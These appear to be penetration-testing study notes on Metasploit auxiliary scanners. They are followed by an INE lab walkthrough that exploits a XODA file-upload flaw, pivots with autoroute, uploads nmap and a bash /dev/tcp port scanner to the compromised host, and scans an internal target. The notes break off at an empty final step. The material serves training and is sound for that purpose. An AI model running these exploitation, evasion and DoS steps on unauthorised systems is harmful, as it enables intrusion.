## 🔧 **Auxiliary Modules in Metasploit**

Auxiliary modules in Metasploit provide a wide range of **non-exploit functionalities** that are essential throughout various phases of a penetration test.

---

### ✅ **Key Functions of Auxiliary Modules**

1. **Scanning & Discovery**
    
    - Perform **TCP/UDP port scans**
        
    - Identify **live hosts**, open ports, and running services
        
    - Examples:
        
        - `auxiliary/scanner/portscan/tcp`
            
        - `auxiliary/scanner/portscan/udp`
            
        - `auxiliary/scanner/discovery/arp_sweep`
            
2. **Service Enumeration**
    
    - Gather detailed information from services such as:
        
        - **FTP, SSH, SMB, HTTP, DNS, SNMP**, etc.
            
    - Examples:
        
        - `auxiliary/scanner/ftp/anonymous`
            
        - `auxiliary/scanner/http/title`
            
        - `auxiliary/scanner/smb/smb_version`
            
3. **Fuzzing**
    
    - Test the robustness of services by sending unexpected or malformed inputs
        
    - Example:
        
        - `auxiliary/fuzzers/ftp/ftp_pre_post`
            
4. **Post-Exploitation Network Discovery**
    
    - After gaining access to a system, auxiliary modules can:
        
        - Scan other subnets
            
        - Enumerate internal services
            
        - Find additional targets (pivoting)
            
    - Example:
        
        - `auxiliary/scanner/portscan/tcp` on a compromised internal system
            
5. **Denial of Service (DoS)**
    
    - Some auxiliary modules are designed to test DoS vulnerabilities
        
    - These are used carefully and mostly in controlled environments
        
    - Example:
        
        - `auxiliary/dos/tcp/synflood`
            

---

### 🧠 **When to Use Auxiliary Modules**

- 🔎 **Information Gathering Phase**:
    
    - Network scanning
        
    - Service detection
        
    - Banner grabbing
        
- 🎯 **Post-Exploitation**:
    
    - Internal network discovery
        
    - Identify lateral movement opportunities
        

---

### 📚 **Bonus Tip**

You can list all auxiliary modules in Metasploit:

```bash
show auxiliary
```

Or filter by scanner type:

```bash
search type:auxiliary name:scanner
```

---

### 🔍 **Common Auxiliary Port Scanner Modules**

#### ✅ 1. **TCP Port Scanner**

```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS <target-ip-or-range>
set PORTS <port-range>
set THREADS 50
run
```

**Example:**

```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 22-1000
set THREADS 100
run
```

---

#### ✅ 2. **SYN Port Scanner (Fast & Stealthy)**

```bash
use auxiliary/scanner/portscan/syn
set RHOSTS <target>
set THREADS 100
run
```

> Requires root/admin privileges.

---

#### ✅ 3. **XMAS Scan (Firewall Evasion Technique)**

```bash
use auxiliary/scanner/portscan/xmas
set RHOSTS <target>
run
```

---

#### ✅ 4. **ACK Scan (Firewall Rule Discovery)**

```bash
use auxiliary/scanner/portscan/ack
set RHOSTS <target>
run
```

---

### 🔧 **Useful Options for All Scanners**

- `RHOSTS`: Target IP or IP range
    
- `PORTS`: Specify port(s), e.g. `1-65535` or `80,443,8080`
    
- `THREADS`: Number of concurrent threads (default 1, increase for speed)
    

---

### 📊 **View Results**

After running the module:

```bash
services       # View open ports and detected services
hosts          # List discovered hosts
```

---

### 🧠 When to Use Auxiliary Scanners Over Nmap?

- Need to **evade firewalls/IDS** (use `syn`, `xmas`, or `ack`)
    
- Want **quick scans** from inside Metasploit without invoking external tools
    
- Working in **custom engagement scripts** that use Metasploit APIs

This lab infrastructure diagram and objective from INE outlines a classic **pivoting and internal reconnaissance** scenario. Here's a structured breakdown of what it's teaching:

---

## 🧪 **Lab Infrastructure Walkthrough**

### 🔹 **Objective**

- Use **Metasploit auxiliary modules** to:
    
    1. Scan and discover **open ports** on the **first target**.
        
    2. **Exploit** a discovered service to gain a **foothold**.
        
    3. Use that foothold to **pivot** into another network/subnet.
        
    4. Scan and enumerate **second target** from within the compromised system.
        

---

### 🖥️ **Visual Topology**

- You → First Target (Direct access)
    
- First Target ↔ Second Target (via internal switch/subnet)
    
- The second target is **not directly accessible** from your machine.
    

---

## 🔧 **Metasploit Flow**

### 🔸 Step 1: Discover Ports on First Target

```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS <first-target-ip>
set THREADS 20
run
```

### 🔸 Step 2: Exploit Vulnerable Service

```bash
use exploit/<relevant/module>
set RHOST <first-target-ip>
set PAYLOAD <payload>
set LHOST <your-ip>
run
```

### 🔸 Step 3: Pivoting

Set up a **route** to the second subnet through the session:

```bash
route add <second-subnet> <session-id>
```

Example:

```bash
route add 192.168.2.0 255.255.255.0 1
```

### 🔸 Step 4: Scan Second Target from Pivot

```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.2.10
run
```

You can now enumerate the second target **as if you're inside the internal network**.

**Step 1:** Open the lab link to access the Kali machine.

**Command:**

```bash
ping -c 4 demo1.ine.local
```

**Step 3:** Port scanning with Nmap

We can now perform a default Nmap port scan on the target to identify the open ports on the target system, this can be done by running the following command:

**Command:**

```bash
nmap demo1.ine.local
```

As shown in the following screenshot, the default Nmap scan does reveal open port 80.

**Command:**

```bash
curl demo1.ine.local
```

As mentioned in the challenge, a XODA web app instance is running on the system which can be exploited using the “exploit/unix/webapp/xoda_file_upload” Metasploit module.

**Step 5:** Start msfconsole

**Command:**

```bash
msfconsole
```

![[Pasted image 20250429153609.png]]

**Step 6:** Select the mentioned module and set the parameter values

**Command:**

```bash
use exploit/unix/webapp/xoda_file_upload

set TARGETURI /
set LHOST 192.63.4.2
```

![[Pasted image 20250429153623.png]]

A meterpreter session is spawned on the target machine.

**Step 7:** Start a command shell and identify the IP address range of the second target machine.

**Command:**

```bash
shell
ip addr
```

![[Pasted image 20250429153642.png]]

The IP address of the first target machine on its eth1 interface is 192.180.108.2, the second target machine will be located at 192.180.108.3 on the second network.

**Step 8:** Add the route to Metasploit's routing table.

**Command:**

```bash
run autoroute -s 192.180.108.2
```

![Content Image](https://assets.ine.com/lab/learningpath/07968dcf96abbf22110539376991731891525735db33c9e8ebe57058c183bf4c.png)

**Step 9:** Background the current meterpreter session and use the portscan tcp module of Metasploit to scan the second target machine.

Press CTRL+z and Enter y to background the meterpreter session.

**Command:**

```
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.180.108.3
set verbose false
set ports 1-1000
exploit
```

![Content Image](https://assets.ine.com/lab/learningpath/29da7e250ed2ac9f29eba96db3162fed0a2e7bf8930e95260a20fba581eff237.png)

**Step 10:** Check the static binaries available in the "/usr/bin/" directory.

**Command:**

```
ls -al /root/static-binaries/nmap
file /root/static-binaries/nmap
```

![Content Image](https://assets.ine.com/lab/learningpath/febcb41de329b1e7454fdb6d1cf4d9413c00d4f9f90ced1d7f5f5015e278e200.png)

**Step 11:** Background the Metasploit session and create a bash port scanning script.

Press CTRL+z to background the Metasploit session.

Using the script provided at [https://catonmat.net/tcp-port-scanner-in-bash] as a reference, create a bash script to scan the first 1000 ports

**Command:**

```
#!/bin/bash
for port in {1..1000}; do
 timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "port $port is open"
done
```

Save the script as bash-port-scanner.sh

![Content Image](https://assets.ine.com/lab/learningpath/a03d047c3ae7d17e3fa9fcbee0d73d58d9cff0477f5c5713bf1fe294dce0e57e.png)

**Step 12:** Foreground the Metasploit session and switch to the meterpreter session.

Press "fg" and press enter to foreground the Metasploit session.

**Command:**

```
sessions -i 1
```

![Content Image](https://assets.ine.com/lab/learningpath/8c9f59c24e771b90b19ccdc1d80af743da90106f6b726d804d162ab80e347648.png)

**Step 13:** Upload the nmap static binary and the bash port scanner script to the target machine.

**Command:**

```
upload /root/static-binaries/nmap /tmp/nmap
upload /root/bash-port-scanner.sh /tmp/bash-port-scanner.sh
```

![Content Image](https://assets.ine.com/lab/learningpath/c8faf7f1d158102bda7fad6f0c69e0786c2b1802dcdb4019648255ff32df3c88.png)

**Step 14:** Make the binary and script executable and use the bash script to scan the second target machine.

**Command:**

```
shell
cd /tmp/
chmod +x ./nmap ./bash-port-scanner.sh
./bash-port-scanner.sh 192.180.108.3
```

![Content Image](https://assets.ine.com/lab/learningpath/84762f9c9a39a0b12cf856a78b2415c5d4427ddea7774f17748850bf475d3551.png)

Three ports are open on the target machine, ports 21, 22 and 80.

**Step 15:** Using the nmap binary, scan the target machine for open ports.

**Command:**

```

```
